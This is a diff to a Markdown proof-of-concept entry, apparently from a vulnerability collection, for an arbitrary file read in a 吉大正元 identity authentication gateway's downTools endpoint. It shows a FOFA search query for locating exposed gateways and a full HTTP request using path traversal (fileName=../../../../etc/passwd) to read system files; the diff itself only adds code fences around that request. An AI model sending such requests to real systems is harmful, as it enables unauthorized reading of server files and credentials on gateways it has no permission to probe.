@@ -79,6 +79,7 @@ FOFA：body="/jit_pnx_portal/" || header="server: jit_pnxcore1 web service" || t
 
 POC/EXP：
 
+```http
 GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
 Host: 127.0.0.1
 Connection: keep-alive
@@ -94,6 +95,8 @@ sec-ch-ua-mobile: ?0
 sec-ch-ua-platform: "Windows"
 Accept-Encoding: gzip, deflate, br, zstd
 Accept-Language: zh-CN,zh;q=0.9
+```
+
 
 ![image-20241101210533785](./.resource/吉大正元身份认证网关downTools任意文件读取漏洞/media/image-20241101210533785.png)
 
